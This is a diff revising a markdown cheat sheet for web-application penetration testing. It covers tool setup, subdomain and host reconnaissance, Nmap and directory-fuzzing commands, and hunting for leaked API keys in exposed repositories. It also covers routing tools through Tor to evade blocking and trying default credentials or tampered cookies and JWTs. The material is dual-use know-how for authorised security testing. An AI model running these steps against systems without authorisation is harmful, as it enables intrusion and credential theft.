@@ -140,41 +140,59 @@ My other cheat sheets:
 
 ## 0. Install Tools and Setup
 
-Most tools can be installed with Linux package manager:
+Most tools can be installed with the Linux package manager:
 
 ```bash
 apt-get update && apt-get -y install sometool
 ```
 
-For more information visit [www.kali.org/tools](https://www.kali.org/tools).
+For more information visit [kali.org/tools](https://www.kali.org/tools).
 
 ---
 
-Some tools need to be downloaded and installed with Python:
+Some Python tools need to be downloaded and installed manually:
 
 ```fundamental
 python3 setup.py install
 ```
 
+Or, installed from the [PyPi](https://pypi.org):
+
+```fundamental
+pip3 install sometool
+
+python3 -m pip install sometool
+```
+
 ---
 
-Some tools need to be downloaded and built with Golang, or installed directly:
+Some Golang tools need to be downloaded and built manually:
 
-```bash
+```fundamental
 go build sometool.go
+```
 
+Or, installed directly:
+
+```fundamental
 go install -v github.com/user/sometool@latest
 ```
 
-To set up Golang, run `apt-get -y install golang`, add the following lines to `~/.zshrc`, and then run `source ~/.zshrc`:
+For more information visit [pkg.go.dev](https://pkg.go.dev).
 
-```fundamental
-export GOROOT=/usr/lib/go
-export GOPATH=$HOME/go
-export PATH=$GOPATH/bin:$GOROOT/bin:$PATH
+To set up Golang, run:
+
+```bash
+apt-get -y install golang
+
+echo "export GOROOT=/usr/lib/go" >> ~/.zshrc
+echo "export GOPATH=$HOME/go" >> ~/.zshrc
+echo "export PATH=$GOPATH/bin:$GOROOT/bin:$PATH" >> ~/.zshrc
+
+source ~/.zshrc
 ```
 
-If you use other console, you might need to write these lines to `~/.bashrc`, etc.
+If you use other console, you might need to write to `~/.bashrc`, etc.
 
 ---
 
@@ -186,9 +204,9 @@ mv sometool.sh /usr/bin/sometool && chmod +x /usr/bin/sometool
 
 ---
 
-Some tools need to be downloaded and ran with Java (JRE):
+Some Java tools need to be downloaded and ran manually with Java (JRE):
 
-```bash
+```fundamental
 java -jar sometool.jar
 ```
 
@@ -196,15 +214,16 @@ java -jar sometool.jar
 
 List of useful APIs to integrate in your tools:
 
-* [scrapeops.io](https://scrapeops.io) (User-Agents)
-* [shodan.io](https://developer.shodan.io) (IoT search engine)
-* [censys.io](https://search.censys.io/api) (domain lookup)
-* [github.com](https://github.com/settings/tokens) (public source code repository lookup)
-* [virustotal.com](https://developers.virustotal.com/reference/overview) (malware database lookup)
+* [scrapeops.io](https://scrapeops.io) - bot-safe User-Agents
+* [shodan.io](https://developer.shodan.io) - IoT search engine and more
+* [censys.io](https://search.censys.io/api) - domain lookup and more
+* [github.com](https://github.com/settings/tokens) - public source code repository lookup
+* [virustotal.com](https://developers.virustotal.com/reference/overview) - malware database lookup
+* [cloud.projectdiscovery.io](https://cloud.projectdiscovery.io) - ProjectDiscovery tools
 
 ### User-Agents
 
-Download a list of bot-safe User-Agents (requires [scrapeops.io](https://scrapeops.io) API key):
+Download a list of bot-safe User-Agents, requires [scrapeops.io](https://scrapeops.io) API key:
 
 ```python
 python3 -c 'import json, requests; open("./user_agents.txt", "w").write(("\n").join(requests.get("http://headers.scrapeops.io/v1/user-agents?api_key=SCRAPEOPS_API_KEY&num_results=100", verify = False).json()["result"]))'
@@ -212,7 +231,7 @@ python3 -c 'import json, requests; open("./user_agents.txt", "w").write(("\n").j
 
 ### DNS Resolvers
 
-Download a list of trusted DNS resolvers (or manually from [trickest/resolvers](https://github.com/trickest/resolvers)):
+Download a list of trusted DNS resolvers, or manually from [trickest/resolvers](https://github.com/trickest/resolvers):
 
 ```python
 python3 -c 'import json, requests; open("./resolvers.txt", "w").write(requests.get("https://raw.githubusercontent.com/trickest/resolvers/main/resolvers-trusted.txt", verify = False).text)'
@@ -220,7 +239,7 @@ python3 -c 'import json, requests; open("./resolvers.txt", "w").write(requests.g
 
 ### ProxyChains-NG
 
-If Google or any other search engine or service blocks your tool, use ProxyChains-NG and Tor to bypass restrictions.
+If Google or any other search engine or service blocks your tool, use ProxyChains-NG and Tor to bypass the restriction.
 
 Installation:
 
@@ -228,7 +247,7 @@ Installation:
 apt-get update && apt-get -y install proxychains4 tor torbrowser-launcher
 ```
 
-Do the following changes to `/etc/proxychains4.conf` file:
+Do the following changes in `/etc/proxychains4.conf`:
 
 ```fundamental
 round_robin
@@ -241,9 +260,9 @@ tcp_connect_time_out 8000
 socks5 127.0.0.1 9050
 ```
 
-Make sure to comment any chain type other than `round_robin` - e.g., comment `strict_chain`.
+Make sure to comment any chain type other than `round_robin` - e.g., comment `strict_chain` into `# strict_chain`.
 
-Don't forget to start Tor:
+Start Tor:
 
 ```fundamental
 service tor start
@@ -255,7 +274,7 @@ Then, run any tool you want:
 proxychains4 sometool
 ```
 
-Using only Tor most likely won't be enough, you will need to add more proxies \([1](https://geonode.com/free-proxy-list)\)\([2](https://proxyscrape.com/home)\) to `/etc/proxychains4.conf` file; although, it is hard to find free and stable proxies that are not already blacklisted.
+Using only Tor most likely won't be enough, you will need to add more proxies \([1](https://geonode.com/free-proxy-list)\)\([2](https://proxyscrape.com/home)\) to `/etc/proxychains4.conf`; however, it is hard to find free and stable proxies that are not already blacklisted.
 
 Download a list of free proxies:
 
@@ -267,41 +286,41 @@ curl -s 'https://proxylist.geonode.com/api/proxy-list?limit=50&page=1&sort_by=la
 
 ## 1. Reconnaissance
 
-Keep in mind that some \[legacy\] websites are accessible only through older web browsers such as Internet Explorer.
+Keep in mind that some \[legacy\] websites might only be accessible through specific web browsers such as Internet Explorer or Edge.
 
-Keep in mind that some websites may be missing the index page and may not redirect you to the home page at all. If that's the case, try to manually guess a full path to the home page, use [wayback machine](https://archive.org) ([gau](#gau)) to find old URLs, or try directory fuzzing with [Feroxbuster](#feroxbuster) or [DirBuster](#dirbuster).
+Keep in mind that some websites may be missing the index page and may not redirect you to the real home page. If that's the case, try to manually guess a full path to the home page, use [wayback machine](https://archive.org) or [gau](#gau) to find old URLs, or try directory fuzzing with [Feroxbuster](#feroxbuster) or [DirBuster](#dirbuster).
 
-Search the Internet for default paths and files for a specific web application. Use the gathered information in combination with [Google Dorks](#google-dorks) or [httpx](#httpx) to find the same paths/files on different websites. For not so common web applications, try to find and browse the source code for default paths/files.
+Search the Internet for default / pre-defined paths and files for a specific web application. Use the gathered information in combination with [Google Dorks](#google-dorks), [Chad](#chad), and [httpx](#httpx) to find the same paths and files on different domains. For not so common web applications, try to find and browse the source code for default / pre-defined paths and files.
 
 You can find the application's source code on [GitHub](https://github.com), [GitLab](https://about.gitlab.com), [searchcode](https://searchcode.com), etc.
 
-Search the application's source code for API keys, SSH keys, credentials, tokens, hidden hosts and domains, etc., with [TruffleHog](#trufflehog). Don't forget to check old GitHub commits for old but still active API keys, secret tokens, etc.
+Search the application's source code for API keys, credentials, secrets, tokens, hosts, etc., with [TruffleHog](#trufflehog) or [File Scraper](#file-scraper). Don't forget to check old GitHub commits for old but still active API keys, credentials, secrets, tokens, etc.
 
 Inspect the web console for possible errors. Inspect the application's source code for possible comments.
 
-**Don't forget to access the web server over an IP address because you may find server's default welcome page or some other content.**
+**Don't forget to access the web server over an IP address because you might find server's default welcome page or some other content.**
 
 ### 1.1 Useful Websites
 
 * [whois.domaintools.com](https://whois.domaintools.com)
-* [otx.alienvault.com](https://otx.alienvault.com) (domain lookup)
-* [reverseip.domaintools.com](https://reverseip.domaintools.com) (web-based reverse IP lookup)
+* [otx.alienvault.com](https://otx.alienvault.com) - domain lookup
+* [reverseip.domaintools.com](https://reverseip.domaintools.com) - web-based reverse IP lookup
 * [lookup.icann.org](https://lookup.icann.org)
 * [sitereport.netcraft.com](https://sitereport.netcraft.com)
-* [searchdns.netcraft.com](https://searchdns.netcraft.com) (web-based DNS lookup)
-* [search.censys.io](https://search.censys.io) (domain lookup)
-* [crt.sh](https://crt.sh) (certificate fingerprinting)
-* [commoncrawl.org](https://commoncrawl.org/the-data/get-started) (web crawl dumps)
-* [opendata.rapid7.com](https://opendata.rapid7.com) (scan dumps)
+* [searchdns.netcraft.com](https://searchdns.netcraft.com) - web-based DNS lookup
+* [search.censys.io](https://search.censys.io) - domain lookup and more
+* [crt.sh](https://crt.sh) - certificate fingerprinting
+* [commoncrawl.org](https://commoncrawl.org/get-started) - web crawl dumps
+* [opendata.rapid7.com](https://opendata.rapid7.com) - scan dumps
 * [searchcode.com](https://searchcode.com)
-* [virustotal.com](https://www.virustotal.com/gui/home/search) (malware database lookup)
+* [virustotal.com](https://www.virustotal.com/gui/home/search) - malware database lookup
 * [haveibeenpwned.com](https://haveibeenpwned.com)
-* [intelx.io](https://intelx.io) (database breaches)
+* [intelx.io](https://intelx.io) - database breaches
 * [search.wikileaks.org](https://search.wikileaks.org)
-* [archive.org](https://archive.org) (wayback machine)
-* [pgp.circl.lu](https://pgp.circl.lu) (OpenPGP key server)
-* [shodan.io](https://www.shodan.io) (IoT search engine)
-* [sherlockeye.io](https://sherlockeye.io) (account lookup)
+* [archive.org](https://archive.org) - wayback machine
+* [pgp.circl.lu](https://pgp.circl.lu) - OpenPGP key server
+* [shodan.io](https://www.shodan.io) - IoT search engine
+* [sherlockeye.io](https://sherlockeye.io) - account lookup
 
 ### Dmitry
 
@@ -328,25 +347,25 @@ Sometimes the output file might default to `/usr/lib/python3/dist-packages/theHa
 Extract hostnames from the results:
 
 ```bash
-js '.hosts[]' theharvester_results.json | sort -uf | tee -a subdomains.txt
+jq '.hosts[]' theharvester_results.json | sort -uf | tee -a subdomains.txt
 ```
 
 Extract IPs from the results:
 
 ```bash
-js '.ips[]' theharvester_results.json | sort -uf | tee -a ips.txt
+jq '.ips[]' theharvester_results.json | sort -uf | tee -a ips.txt
 ```
 
 Extract emails from the results:
 
 ```bash
-js '.emails[]' theharvester_results.json | sort -uf | tee -a emails.txt
+jq '.emails[]' theharvester_results.json | sort -uf | tee -a emails.txt
 ```
 
 Extract emails from the results:
 
 ```bash
-js '.asns[]' theharvester_results.json | sort -uf | tee -a asns.txt
+jq '.asns[]' theharvester_results.json | sort -uf | tee -a asns.txt
 ```
 
 ### FOCA (Fingerprinting Organizations with Collected Archives)
@@ -355,7 +374,7 @@ Find metadata and hidden information in files.
 
 Tested on Windows 10 Enterprise OS (64-bit).
 
-Setup:
+Minimum requirements:
 
 * download and install [MS SQL Server 2014 Express](https://www.microsoft.com/en-us/download/details.aspx?id=42299) or greater,
 * download and install [MS .NET Framework 4.7.1 Runtime](https://dotnet.microsoft.com/download/dotnet-framework/net471) or greater,
@@ -368,23 +387,22 @@ GUI is very intuitive.
 
 Installation:
 
-```bash
+```fundamental
 go install -v github.com/projectdiscovery/uncover/cmd/uncover@latest
 ```
 
-Set your API keys in `/root/.config/uncover/provider-config.yaml` file as following:
+Set your API keys in `/root/.config/uncover/provider-config.yaml` as following:
 
 ```fundamental
 shodan:
   - SHODAN_API_KEY
 censys:
   - CENSYS_API_ID:CENSYS_API_SECRET
-fofa: []
 ```
 
 Gather information using Shodan, Censys, and more:
 
-```fundamental
+```bash
 uncover -json -o uncover_results.json -l 100 -e shodan,censys -q somedomain.com
 
 jq -r '.host // empty' uncover_results.json | sort -uf | tee -a subdomains.txt
@@ -392,7 +410,7 @@ jq -r '.host // empty' uncover_results.json | sort -uf | tee -a subdomains.txt
 jq -r '.ip // empty' uncover_results.json | sort -uf | tee -a ips.txt
 ```
 
-TO DO: Shodan and Censys Dorks.
+TO DO: More Shodan and Censys Dorks.
 
 ### assetfinder
 
@@ -414,8 +432,8 @@ sublist3r -o sublister_results.txt -d somedomain.com
 
 Installation:
 
-```bash
-go install -v go install -v github.com/projectdiscovery/subfinder/v2/cmd/subfinder@latest
+```fundamental
+go install -v github.com/projectdiscovery/subfinder/v2/cmd/subfinder@latest
 ```
 
 Gather subdomains using OSINT:
@@ -424,7 +442,7 @@ Gather subdomains using OSINT:
 subfinder -t 10 -timeout 3 -nW -o subfinder_results.txt -rL resolvers.txt -d somedomain.com
 ```
 
-Subfinder has built-in DNS resolvers.
+**Subfinder has built-in DNS resolvers.**
 
 Set your API keys in `/root/.config/subfinder/config.yaml` file as following:
 
@@ -447,7 +465,7 @@ Gather subdomains using OSINT:
 amass enum -o amass_results.txt -trf resolvers.txt -d somedomain.com
 ```
 
-Amass has built-in DNS resolvers.
+**Amass has built-in DNS resolvers.**
 
 To find ASNs from IPs and CIDRs from ASNs, use [WHOIS](#whois-asn-cidr). The below ASN and CIDR scans will take a long time to finish. **The results might not be all within your scope!**
 
@@ -495,7 +513,7 @@ Reverse IP lookup:
 dig +noall +answer -x 192.168.8.5
 ```
 
-\[Subdomain Takeover\] Check if domains/subdomains are dead or not, look for `NXDOMAIN`, `SERVFAIL`, or `REFUSED` status codes (check [host](#host) tool for the next step):
+\[Subdomain Takeover\] Check if domains/subdomains are dead, look for `NXDOMAIN`, `SERVFAIL`, or `REFUSED` status codes:
 
 ```bash
 for subdomain in $(cat subdomains.txt); do res=$(dig "${subdomain}" -t A +noall +comments +timeout=3 | grep -Po '(?<=status\:\ )[^\s]+(?<!\,)'); echo "${subdomain} | ${res}"; done | sort -uf | tee -a subdomains_to_status.txt
@@ -504,6 +522,8 @@ grep -v 'NOERROR' subdomains_to_status.txt | grep -Po '[^\s]+(?=\ \|)' | sort -u
 
 grep 'NOERROR' subdomains_to_status.txt | grep -Po '[^\s]+(?=\ \|)' | sort -uf | tee -a subdomains_errors_none.txt
 ```
+
+See [host](#host) tool for the next step.
 
 ### Fierce
 
@@ -515,7 +535,7 @@ fierce -file fierce_std_results.txt --domain somedomain.com
 fierce -file fierce_brt_results.txt --subdomain-file subdomains-top1mil.txt --domain somedomain.com
 ```
 
-By default, Fierce will perform brute force attack with its built-in wordlist.
+**By default, Fierce will perform brute force attack with its built-in wordlist.**
 
 ### DNSRecon
 
@@ -531,7 +551,7 @@ dnsrecon -v --iw -f --lifetime 3 --threads 50 -t brt --json /root/Desktop/dnsrec
 
 DNSRecon can perform a brute force attack with a user-defined wordlist, but make sure to specify a full path to the wordlist; otherwise, DNSRecon might not recognize it.
 
-Make sure to specify a full path to the output file; otherwise, it will default to `/usr/share/dnsrecon/` directory (i.e., to the root directory).
+Make sure to specify a full path to the output file; otherwise, it will default to `/usr/share/dnsrecon/` directory, i.e., to the root directory.
 
 Extract hostnames from the standard/zone transfer/brute force results:
 
@@ -575,7 +595,7 @@ for subdomain in $(cat subdomains.txt); do res=$(host -t A "${subdomain}" | grep
 grep -Po '(?<=\|\ )[^\s]+' subdomains_to_ips.txt | sort -uf | tee -a ips.txt
 ```
 
-Check if domains/subdomains are alive or not with [httpx](#httpx). Check if IPs are alive or not with [Nmap](#nmap).
+Check if domains/subdomains are alive with [httpx](#httpx). Check if IPs are alive with [Nmap](#nmap) doing the ping sweep.
 
 Gather virtual hosts for the given IPs (ask for `PTR` records):
 
@@ -619,17 +639,17 @@ for ip in $(cat ips.txt); do res=$(whois -h whois.arin.net "${ip}" | grep -Po '(
 grep -Po '(?<=\|\ )(?(?!\ \|).)+' ips_to_organization_names.txt | sort -uf | tee -a organization_names.txt
 ```
 
-Check if any IP belongs to [GitHub](https://github.com) organization, more info about GitHub the takeover in this [article](https://www.hackerone.com/application-security/guide-subdomain-takeovers).
+Check if any IP belongs to [GitHub](https://github.com) organization, read more about GitHub takeover in this [H1 article](https://www.hackerone.com/application-security/guide-subdomain-takeovers).
 
 ### ASNmap
 
 Installation:
 
 ```fundamental
-go install github.com/projectdiscovery/asnmap/cmd/asnmap@latest
+go install -v github.com/projectdiscovery/asnmap/cmd/asnmap@latest
 ```
 
-Get the ProjectDiscovery API key from [cloud.projectdiscovery.io](https://cloud.projectdiscovery.io) and set it up:
+Get the ProjectDiscovery API key from [cloud.projectdiscovery.io](https://cloud.projectdiscovery.io) and run:
 
 ```fundamental
 asnmap -auth
@@ -637,19 +657,19 @@ asnmap -auth
 
 Gather [CIDRs](https://www.arin.net/resources/guide/asn) from ASN:
 
-```fundamental
+```bash
 asnmap -r resolvers.txt -a asn | tee -a asnmap_cidr_results.txt
 ```
 
 Gather [CIDRs](https://www.arin.net/resources/guide/asn) from organization ID:
 
-```fundamental
+```bash
 asnmap -r resolvers.txt -org id | tee -a asnmap_cidr_results.txt
 ```
 
 ### httpx
 
-Check if domains/subdomains are alive or not (map live hosts):
+Check if domains/subdomains are alive, map live hosts:
 
 ```bash
 httpx-toolkit -o httpx_results.txt -l subdomains_errors_none.txt
@@ -657,7 +677,7 @@ httpx-toolkit -o httpx_results.txt -l subdomains_errors_none.txt
 httpx-toolkit -random-agent -json -o httpx_results.json -threads 100 -timeout 3 -l subdomains_errors_none.txt -ports 80,443,8008,8080,8403,8443,9008,9080,9403,9443
 ```
 
-Filter domains/subdomains from the JSON results:
+Filter out domains/subdomains from the JSON results:
 
 ```bash
 jq -r 'select(."status-code" | tostring | test("^2|^3|^4")).url' httpx_results.json | sort -uf | tee -a subdomains_live_long.txt
@@ -689,7 +709,7 @@ grep -Po '(?<=https\:\/\/)[^\s]+' subdomains_live_long.txt | sort -uf | tee -a s
 grep -Po '(?<=\:\/\/)[^\s\:]+' subdomains_live_long.txt | sort -uf | tee -a subdomains_live.txt
 ```
 
-Check if directory exists on a web server:
+Check if a directory exists on a web server:
 
 ```bash
 httpx-toolkit -status-code -content-length -o httpx_results.txt -l subdomains_live_long.txt -path /.git
@@ -705,7 +725,7 @@ getallurls somedomain.com | tee gau_results.txt
 for subdomain in $(cat subdomains_live.txt); do getallurls "${subdomain}"; done | sort -uf | tee gau_results.txt
 ```
 
-Filter URLs from the results:
+Filter out URLs from the results:
 
 ```bash
 httpx-toolkit -random-agent -json -o httpx_gau_results.json -threads 100 -timeout 3 -r resolvers.txt -l gau_results.txt
@@ -737,7 +757,7 @@ urlhunter -o urlhunter_results.txt -date latest -keywords keywords.txt
 
 ### Google Dorks
 
-Google Dorks databases:
+Google Dork databases:
 
 * [exploit-db.com/google-hacking-database](https://www.exploit-db.com/google-hacking-database)
 * [cxsecurity.com/dorks](https://cxsecurity.com/dorks)
@@ -794,11 +814,11 @@ Run a single Google Dork:
 chad -nsos -q 'intitle:"index of /" intext:"parent directory"' -s *.somedomain.com
 ```
 
-For advanced use and automation, check the [project page](https://github.com/ivan-sincek/chad).
+More about my project at [ivan-sincek/chad](https://github.com/ivan-sincek/chad).
 
 ### PhoneInfoga
 
-Download the latest version from [GitHub](https://github.com/sundowndev/phoneinfoga/releases). See how to [install](#0-install-tools-and-setup) the tool.
+Download the latest version from [GitHub](https://github.com/sundowndev/phoneinfoga/releases) and check how to [install](#0-install-tools-and-setup) the tool.
 
 Get a phone number information:
 
@@ -816,13 +836,13 @@ Navigate to `http://localhost:5000` with your preferred web browser.
 
 ### git-dumper
 
-Try to reconstruct a GitHub repository (i.e., get the source code) based on the commit history from a public `/.git` directory:
+Try to reconstruct a GitHub repository, i.e., get the source code, based on the commit history from a public `/.git` directory:
 
 ```fundamental
 git-dumper https://somesite.com/.git git_dumper_results
 ```
 
-This tool might not be able to reconstruct the whole repository at all times, but it could still reveal some sensitive information.
+This tool might not be able to reconstruct the whole repository every time, but it could still reveal some sensitive information.
 
 Some additional `git` commands to try on the cloned `/.git` directory:
 
@@ -862,14 +882,14 @@ Search for sensitive keys inside files and directories:
 trufflehog filesystem somefile_1.txt somefile_2.txt somedir1 somedir2
 ```
 
-For more usage, check [trufflesecurity/trufflehog](https://github.com/trufflesecurity/trufflehog).
+More about the project at [trufflesecurity/trufflehog](https://github.com/trufflesecurity/trufflehog).
 
 ### katana
 
 Installation:
 
 ```fundamental
-go install github.com/projectdiscovery/katana/cmd/katana@latest
+go install -v github.com/projectdiscovery/katana/cmd/katana@latest
 ```
 
 Crawl a website:
@@ -880,11 +900,9 @@ katana -timeout 3 -retry 1 -c 30 -o katana_results.txt -ps -jc -iqp -d 1 -u http
 katana -timeout 3 -retry 1 -c 30 -o katana_results.txt -ps -jc -iqp -d 1 -u subdomains_live_long_2xx.txt
 ```
 
-Check a lot more options with `-h` or `--help`.
-
 ### Scrapy Scraper
 
-Crawl a website, and download and beautify \[minified\] JavaScript files:
+Crawl a website, download, and beautify \[minified\] JavaScript files:
 
 ```fundamental
 scrapy-scraper -cr 30 -a random -o scrapy_scraper_results.txt -p -r 1 -dir somedir -u https://somesite.com/home
@@ -902,15 +920,15 @@ playwright install chromium
 
 More about my project at [ivan-sincek/scrapy-scraper](https://github.com/ivan-sincek/scrapy-scraper).
 
-Scrape the JavaScript files using [TruffleHog](#trufflehog).
+Scrape the JavaScript files using [TruffleHog](#trufflehog) or [File Scraper](#file-scraper).
 
 ### Directory Fuzzing
 
-**Don't forget that GNU/Linux OS has a case sensitive file system, so make sure to use an appropriate wordlists.**
+**Don't forget that GNU/Linux OS has a case sensitive file system, so make sure to use the right wordlists.**
 
 If you don't get any hits while brute forcing directories, try to brute force files by specifying file extensions.
 
-The following tools support recursive directory search and file search; also, they might take a long time to finish depending on the settings and wordlist used.
+The below tools support recursive directory and file search. Also, they might take a long time to finish depending on the used settings and wordlist.
 
 ### DirBuster
 
@@ -928,9 +946,9 @@ Brute force directories on a web server:
 cat subdomains_live_long.txt | feroxbuster --stdin -k -n --auto-bail --random-agent -t 50 -T 3 --json -o feroxbuster_results.txt -s 200,301,302,401,403 -w directory-list-lowercase-2.3-medium.txt
 ```
 
-This tool seems to be faster than [DirBuster](#dirbuster).
+This tool is faster than [DirBuster](#dirbuster).
 
-Filter directories from the results:
+Filter out directories from the results:
 
 ```bash
 jq -r 'select(.status | tostring | test("^2")).url' feroxbuster_results.json | sort -uf | tee -a directories_2xx.txt
@@ -952,7 +970,7 @@ jq -r 'select(.status | tostring | test("^5")).url' feroxbuster_results.json | s
 | --- | --- |
 | -u | The target URL (required, unless \[--stdin \| --resume-from\] is used) |
 | --stdin | Read URL(s) from STDIN |
-| -a/-A | Sets the User-Agent (default: feroxbuster\/2.7.3) \/ Use a random User-Agent |
+| -a/-A | Sets the User-Agent (default: feroxbuster\/x.x.x) \/ Use a random User-Agent |
 | -x | File extension(s) to search for (ex: -x php -x pdf,js) |
 | -m | Which HTTP request method(s) should be sent (default: GET) |
 | --data | Request's body; can read data from a file if input starts with an \@(ex: \@post.bin) |
@@ -967,7 +985,7 @@ jq -r 'select(.status | tostring | test("^5")).url' feroxbuster_results.json | s
 | -n | Do not scan recursively |
 | -w | Path to the wordlist |
 | --auto-bail | Automatically stop scanning when an excessive amount of errors are encountered |
-| -B | Automatically request likely backup extensions for "found" URLs |
+| -B | Automatically request likely backup extensions for "found" URLs (default: ~, .bak, .bak2, .old, .1) |
 | -q | Hide progress bars and banner (good for tmux windows w/ notifications) |
 | -o | Output file to write results to (use w/ --json for JSON entries) |
 
@@ -1035,7 +1053,7 @@ Install SecLists (the collection will be stored at `/usr/share/seclists/` direct
 apt-get update && apt-get install seclists
 ```
 
-My contribution to SecLists: [danielmiessler/SecLists/tree/master/Fuzzing/Amounts](https://github.com/danielmiessler/SecLists/tree/master/Fuzzing/Amounts)
+My contribution to the SecLists: [danielmiessler/SecLists/tree/master/Fuzzing/Amounts](https://github.com/danielmiessler/SecLists/tree/master/Fuzzing/Amounts)
 
 Another popular wordlist collections:
 
@@ -1047,19 +1065,19 @@ Another popular wordlist collections:
 
 ## 2. Scanning/Enumeration
 
-Keep in mind that web applications can be hosted on other ports besides 80 (HTTP) and 443 (HTTPS), e.g., they can be hosted on port 8443 (HTTPS).
+Keep in mind that web applications or services can be hosted on other ports besides 80 (HTTP) and 443 (HTTPS), e.g., they can be hosted on port 8443 (HTTPS).
 
-Keep in mind that on ports 80 (HTTP) and 443 (HTTPS) a web server can host different web applications or some other services entirely. Use [Ncat](#ncat) or Telnet for banner grabbing.
+Keep in mind that on ports 80 (HTTP) and 443 (HTTPS) a web server can host different web applications or services. Use [Ncat](#ncat) or Telnet for banner grabbing.
 
-Keep in mind that on different URL paths a web server can host different web applications or some other services entirely, e.g., `somesite.com/app_one/` and `somesite.com/app_two/`.
+Keep in mind that on different URL paths a web server can host different web applications or services, e.g., `somesite.com/app_one/` and `somesite.com/app_two/`.
 
-While scanning for vulnerabilities or running any other intensive scans, periodically check the web application/service in case it crashed so you can alert your client as soon as possible. Also, many times you might get temporarily blocked by the web application firewall (WAF) or some other security product and all your subsequent requests will be invalid.
+While scanning for vulnerabilities or running other intensive scans, periodically check the web application or service if it crashed, so that you can alert your client as soon as possible; or in case you got rate limited by the web application firewall (WAF) or some other security product, so that you can pause your scans because all your subsequent requests will be blocked and your results will not be complete.
 
-If a web application all of sudden stops responding, try to access the web application with your mobile data (i.e., use a different IP). It is possible that your current IP was temporarily blocked.
+If a web application or service all of sudden stops responding, try to access the web application or service using your mobile data, i.e., using a different IP. It is possible that your current IP was temporarily blocked.
 
 Send an email message to a non-existent address at target's domain, it will often reveal useful internal network information through a nondelivery notification (NDN).
 
-Try to invest into [Nessus Professional](https://www.tenable.com/products/nessus) and [Burp Suite Professional](https://portswigger.net/burp) or any other similar permium tools if you can afford them.
+Get a free [Nessus Community](https://community.tenable.com/s/article/Nessus-Essentials), and if you can afford it, get [Burp Suite Professional](https://portswigger.net/burp) or [Caido](https://caido.io).
 
 ### 2.1 Useful Websites
 
@@ -1074,15 +1092,15 @@ Try to invest into [Nessus Professional](https://www.tenable.com/products/nessus
 
 **For better results, use IPs instead of domain names.**
 
-**Some web servers will not respond to ping (ICMP) requests, so the mapping of the live hosts will not be accurate.**
+Ping sweep, map live hosts:
 
-Ping sweep (map live hosts):
-
-```bash
+```fundamental
 nmap -sn -oG nmap_ping_sweep_results.txt 192.168.8.0/24
 
 nmap -sn -oG nmap_ping_sweep_results.txt -iL cidrs.txt
 ```
+
+**Some web servers will not respond to ping (ICMP) requests, so the mapping of the live hosts will not be accurate.**
 
 Extract live hosts from the results:
 
@@ -1090,7 +1108,7 @@ Extract live hosts from the results:
 grep -Po '(?<=Host\:\ )[^\s]+' nmap_ping_sweep_results.txt | sort -uf | tee -a ips_live.txt
 ```
 
-TCP scan (all ports):
+TCP scan, all ports:
 
 ```fundamental
 nmap -nv -sS -sV -sC -Pn -oN nmap_tcp_results.txt -p- 192.168.8.0/24
@@ -1098,7 +1116,7 @@ nmap -nv -sS -sV -sC -Pn -oN nmap_tcp_results.txt -p- 192.168.8.0/24
 nmap -nv -sS -sV -sC -Pn -oN nmap_tcp_results.txt -p- -iL cidrs.txt
 ```
 
-\[Variation\] TCP scan (all ports):
+Automate TCP scan:
 
 ```bash
 mkdir nmap_tcp_results
@@ -1106,7 +1124,7 @@ mkdir nmap_tcp_results
 for ip in $(cat ips_live.txt); do nmap -nv -sS -sV -sC -Pn -oN "nmap_tcp_results/nmap_tcp_results_${ip//./_}.txt" -p- "${ip}"; done
 ```
 
-UDP scan (only important ports):
+UDP scan, only important ports:
 
 ```fundamental
 nmap -nv -sU -sV -sC -Pn -oN nmap_udp_results.txt -p 53,67,68,69,88,123,135,137,138,139,161,162,389,445,500,514,631,1900,4500 192.168.8.0/24
@@ -1114,7 +1132,7 @@ nmap -nv -sU -sV -sC -Pn -oN nmap_udp_results.txt -p 53,67,68,69,88,123,135,137,
 nmap -nv -sU -sV -sC -Pn -oN nmap_udp_results.txt -p 53,67,68,69,88,123,135,137,138,139,161,162,389,445,500,514,631,1900,4500 -iL cidrs.txt
 ```
 
-\[Variation\] UDP scan (only important ports):
+Automate UDP scan:
 
 ```bash
 mkdir nmap_udp_results
@@ -1166,7 +1184,7 @@ Installation:
 apt-get update && apt-get -y install testssl.sh
 ```
 
-Test an SSL/TLS certificate (i.e., SSL/TLS ciphers, protocols, etc.):
+Test an SSL/TLS certificate (e.g., SSL/TLS ciphers, protocols, etc.):
 
 ```fundamental
 testssl --openssl /usr/bin/openssl -oH testssl_results.html somesite.com
@@ -1195,27 +1213,27 @@ keytool -printcert -rfc -sslserver somesite.com > keytool_results.txt
 openssl x509 -noout -text -in keytool_results.txt
 ```
 
-Use [uncover](#uncover) with certificate Shodan and Censys Dorks to find more possibly in-scope hosts.
+Use [uncover](#uncover) with Shodan and Censys SSL/TLS Dorks to find more in-scope hosts.
 
 ## 3. Vulnerability Assesment/Exploiting
 
-Always try the null session login (i.e., no password login) or search the Internet for default credentials for a specific web application.
+Always try the null session login, i.e., no password login, or search the Internet for default credentials for a specific web application.
 
-Try to manipulate cookies or tokens to gain access or elevate privileges. On logout, always check if any of the cookies or tokens is still valid.
+Try to manipulate cookies or JWT tokens to gain access or elevate privileges. On logout, always check if any of the cookies or JWT tokens are still valid.
 
-Always inspect web browser's local storage, especially for single-page applications (SPAs).
+Always inspect web browser's local storage, especially if testing a single-page application (SPA).
 
-Try to transform, e.g., an HTTP POST request into an HTTP GET request (i.e., into a query string), and see if a server will accept it.
+Try to transform, e.g., an HTTP POST request into an HTTP GET request, i.e., into a query string, and see if a server will accept it.
 
 Turn off JavaScript in your web browser and check the web application behaviour again.
 
-Check the web application behaviour on mobile devices, e.g., check `m.somesite.com` for vulnerabilities because some features might work differently.
+Check the web application behaviour on a mobile device as some features might work differently. Try spoofing your User-Agent or try to visiting `m.somesite.com`.
 
-If you want to automate your code injection testing, check the [Wordlists](#wordlists) sub-section for code injection wordlists. Most of the wordlists also include obfuscated code injections.
+If you want to automate your code injection testing, check the [Wordlists](#wordlists) sub-section for code injection wordlists. Some of the wordlists also include obfuscated code injections.
 
-If you see any amounts or quantities, try to use [danielmiessler/SecLists/tree/master/Fuzzing/Amounts](https://github.com/danielmiessler/SecLists/tree/master/Fuzzing/Amounts) wordlist as it might cause unintended behavior, error, or even bypass the minimum and maximum boundary.
+If you see any amounts or quantities, try to use [danielmiessler/SecLists/tree/master/Fuzzing/Amounts](https://github.com/danielmiessler/SecLists/tree/master/Fuzzing/Amounts) wordlist as it might cause unintended behavior, errors, or even bypass the minimum and maximum boundaries.
 
-**Don't forget to remove all the created artifacts (malware, exploits, tools, scripts, etc.) from a target host after you are done testing.**
